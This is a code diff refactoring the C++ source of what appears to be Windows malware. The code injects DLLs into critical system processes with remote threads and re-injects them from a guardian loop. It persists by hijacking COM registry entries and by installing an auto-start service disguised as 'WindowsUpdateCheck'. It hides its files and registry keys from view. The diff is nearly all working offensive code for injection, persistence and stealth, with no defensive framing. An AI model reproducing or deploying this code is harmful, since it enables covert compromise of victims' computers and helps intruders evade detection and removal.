@@ -393,10 +393,10 @@ bool IsCriticalProcess(const std::string& name) {
 
 namespace injection {
 
-bool InjectIntoProcess(const std::string& target, const std::string& selfPath) {
+DWORD FindProcessId(const std::string& target) {
     DWORD pid = 0;
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return false;
+    if (snap == INVALID_HANDLE_VALUE) return 0;
 
     PROCESSENTRY32W pe;
     pe.dwSize = sizeof(PROCESSENTRY32W);
@@ -412,20 +412,21 @@ bool InjectIntoProcess(const std::string& target, const std::string& selfPath) {
         } while (Process32NextW(snap, &pe));
     }
     CloseHandle(snap);
+    return pid;
+}
 
-    if (pid == 0) return false;
-
+bool InjectIntoProcess(DWORD pid, const std::string& payload) {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) return false;
 
-    size_t pathLen = selfPath.size() + 1;
+    size_t pathLen = payload.size() + 1;
     LPVOID alloc = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
     if (!alloc) {
         CloseHandle(hProcess);
         return false;
     }
 
-    WriteProcessMemory(hProcess, alloc, selfPath.c_str(), pathLen, NULL);
+    WriteProcessMemory(hProcess, alloc, payload.c_str(), pathLen, NULL);
 
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
         reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryA), alloc, 0, NULL);
@@ -438,6 +439,11 @@ bool InjectIntoProcess(const std::string& target, const std::string& selfPath) {
 
     CloseHandle(hProcess);
     return hThread != NULL;
+}
+
+bool InjectIntoProcess(const std::string& target, const std::string& selfPath) {
+    DWORD pid = FindProcessId(target);
+    return pid ? InjectIntoProcess(pid, selfPath) : false;
 }
 
 bool InjectIntoCriticalProcesses(const std::string& selfPath) {
@@ -454,7 +460,7 @@ bool InjectIntoCriticalProcesses(const std::string& selfPath) {
             std::string narrow(name.begin(), name.end());
 
             if (detection::IsCriticalProcess(narrow)) {
-                if (InjectIntoProcess(narrow, selfPath)) {
+                if (InjectIntoProcess(pe.th32ProcessID, selfPath)) {
                     success = true;
                     std::this_thread::sleep_for(std::chrono::seconds(1));
                 }
@@ -1018,7 +1024,8 @@ void GuardianLoop() {
                         if (!GetExitCodeProcess(hProcess, &exitCode) || exitCode != STILL_ACTIVE) {
                             CloseHandle(hProcess);
                             injection::InjectIntoCriticalProcesses(selfPath);
-                            break;
+                            CloseHandle(snap);
+                            return;
                         }
                         CloseHandle(hProcess);
                     }
@@ -1454,58 +1461,13 @@ bool RemovePermanentEventConsumer() {
 
 namespace dll {
 
-bool CreatePayloadDLL(const std::string& outputPath, const std::string&) {
-    return false;
-}
-
 bool InjectDLL(const std::string& dllPath, DWORD pid) {
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return false;
-
-    size_t pathLen = dllPath.size() + 1;
-    LPVOID alloc = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
-    if (!alloc) {
-        CloseHandle(hProcess);
-        return false;
-    }
-
-    WriteProcessMemory(hProcess, alloc, dllPath.c_str(), pathLen, NULL);
-
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
-        reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryA), alloc, 0, NULL);
-
-    if (hThread) {
-        WaitForSingleObject(hThread, INFINITE);
-        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
-        CloseHandle(hThread);
-    }
-
-    CloseHandle(hProcess);
-    return hThread != NULL;
+    return injection::InjectIntoProcess(pid, dllPath);
 }
 
 bool InjectDLLIntoProcess(const std::string& processName, const std::string& dllPath) {
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return false;
-
-    PROCESSENTRY32W pe;
-    pe.dwSize = sizeof(PROCESSENTRY32W);
-
-    DWORD pid = 0;
-    if (Process32FirstW(snap, &pe)) {
-        do {
-            std::wstring name(pe.szExeFile);
-            std::string narrow(name.begin(), name.end());
-            if (narrow == processName || narrow.find(processName) != std::string::npos) {
-                pid = pe.th32ProcessID;
-                break;
-            }
-        } while (Process32NextW(snap, &pe));
-    }
-    CloseHandle(snap);
-
-    if (pid == 0) return false;
-    return InjectDLL(dllPath, pid);
+    DWORD pid = injection::FindProcessId(processName);
+    return pid ? InjectDLL(dllPath, pid) : false;
 }
 
 }
@@ -1663,6 +1625,12 @@ std::string DecryptMessage(const std::string& data) {
 
 namespace com {
 
+const char* COM_OBJECTS[] = {
+    "{B5F8350B-0548-48B1-A6EE-F85C1B1B6BD4}",
+    "{9A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6D}",
+    "{1A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6E}"
+};
+
 bool HijackCOM(const std::string& clsid, const std::string& dllPath) {
     HKEY hKey;
     std::string keyPath = "Software\\Classes\\CLSID\\" + clsid + "\\InprocServer32";
@@ -1683,34 +1651,18 @@ bool HijackCOM(const std::string& clsid, const std::string& dllPath) {
 }
 
 bool InstallCOMPersistence(const std::string& exePath) {
-    const char* comObjects[] = {
-        "{B5F8350B-0548-48B1-A6EE-F85C1B1B6BD4}",
-        "{9A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6D}",
-        "{1A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6E}"
-    };
-
     bool success = true;
-    for (const char* clsid : comObjects) {
-        if (!HijackCOM(clsid, exePath)) {
-            success = false;
-        }
+    for (const char* clsid : COM_OBJECTS) {
+        if (!HijackCOM(clsid, exePath)) success = false;
     }
     return success;
 }
 
 bool RemoveCOMPersistence() {
-    const char* comObjects[] = {
-        "{B5F8350B-0548-48B1-A6EE-F85C1B1B6BD4}",
-        "{9A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6D}",
-        "{1A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6E}"
-    };
-
     bool success = true;
-    for (const char* clsid : comObjects) {
+    for (const char* clsid : COM_OBJECTS) {
         std::string keyPath = "Software\\Classes\\CLSID\\" + std::string(clsid) + "\\InprocServer32";
-        if (RegDeleteTreeA(HKEY_CURRENT_USER, keyPath.c_str()) != ERROR_SUCCESS) {
-            success = false;
-        }
+        if (RegDeleteTreeA(HKEY_CURRENT_USER, keyPath.c_str()) != ERROR_SUCCESS) success = false;
     }
     return success;
 }
@@ -1745,19 +1697,18 @@ bool HideFromProcessList(DWORD pid) {
     return false;
 }
 
-bool HideFile(const std::string& path) {
+bool SetFileVisibility(const std::string& path, bool hide) {
     std::wstring wpath(path.begin(), path.end());
     DWORD attrs = GetFileAttributesW(wpath.c_str());
     if (attrs == INVALID_FILE_ATTRIBUTES) return false;
-    return SetFileAttributesW(wpath.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM) != 0;
+
+    DWORD newAttrs = hide ? (attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
+                          : (attrs & ~(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM));
+    return SetFileAttributesW(wpath.c_str(), newAttrs) != 0;
 }
 
-bool UnhideFile(const std::string& path) {
-    std::wstring wpath(path.begin(), path.end());
-    DWORD attrs = GetFileAttributesW(wpath.c_str());
-    if (attrs == INVALID_FILE_ATTRIBUTES) return false;
-    return SetFileAttributesW(wpath.c_str(), attrs & ~(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) != 0;
-}
+bool HideFile(const std::string& path) { return SetFileVisibility(path, true); }
+bool UnhideFile(const std::string& path) { return SetFileVisibility(path, false); }
 
 bool HideRegistryKey(const std::string& keyPath) {
     HKEY hKey;
@@ -1791,8 +1742,16 @@ bool HideRegistryKey(const std::string& keyPath) {
 
 namespace service {
 
+SC_HANDLE OpenSCM() {
+    return OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+}
+
+SC_HANDLE OpenService(SC_HANDLE hSCManager, DWORD access = SERVICE_ALL_ACCESS) {
+    return OpenServiceA(hSCManager, "WindowsUpdateCheck", access);
+}
+
 bool InstallService() {
-    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    SC_HANDLE hSCManager = OpenSCM();
     if (!hSCManager) return false;
 
     std::string exePath = utils::GetSelfPath();
@@ -1800,21 +1759,17 @@ bool InstallService() {
         SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
         exePath.c_str(), NULL, NULL, NULL, NULL, NULL);
 
-    if (!hService) {
-        CloseServiceHandle(hSCManager);
-        return false;
-    }
-
-    CloseServiceHandle(hService);
+    bool result = hService != NULL;
+    if (hService) CloseServiceHandle(hService);
     CloseServiceHandle(hSCManager);
-    return true;
+    return result;
 }
 
 bool UninstallService() {
-    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    SC_HANDLE hSCManager = OpenSCM();
     if (!hSCManager) return false;
 
-    SC_HANDLE hService = OpenServiceA(hSCManager, "WindowsUpdateCheck", SERVICE_ALL_ACCESS);
+    SC_HANDLE hService = OpenService(hSCManager);
     if (!hService) {
         CloseServiceHandle(hSCManager);
         return false;
@@ -1827,10 +1782,10 @@ bool UninstallService() {
 }
 
 bool StartService() {
-    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    SC_HANDLE hSCManager = OpenSCM();
     if (!hSCManager) return false;
 
-    SC_HANDLE hService = OpenServiceA(hSCManager, "WindowsUpdateCheck", SERVICE_ALL_ACCESS);
+    SC_HANDLE hService = OpenService(hSCManager);
     if (!hService) {
         CloseServiceHandle(hSCManager);
         return false;
@@ -1843,10 +1798,10 @@ bool StartService() {
 }
 
 bool StopService() {
-    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    SC_HANDLE hSCManager = OpenSCM();
     if (!hSCManager) return false;
 
-    SC_HANDLE hService = OpenServiceA(hSCManager, "WindowsUpdateCheck", SERVICE_ALL_ACCESS);
+    SC_HANDLE hService = OpenService(hSCManager);
     if (!hService) {
         CloseServiceHandle(hSCManager);
         return false;
@@ -1860,10 +1815,10 @@ bool StopService() {
 }
 
 bool IsServiceInstalled() {
-    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    SC_HANDLE hSCManager = OpenSCM();
     if (!hSCManager) return false;
 
-    SC_HANDLE hService = OpenServiceA(hSCManager, "WindowsUpdateCheck", SERVICE_QUERY_CONFIG);
+    SC_HANDLE hService = OpenService(hSCManager, SERVICE_QUERY_CONFIG);
     if (!hService) {
         CloseServiceHandle(hSCManager);
         return false;
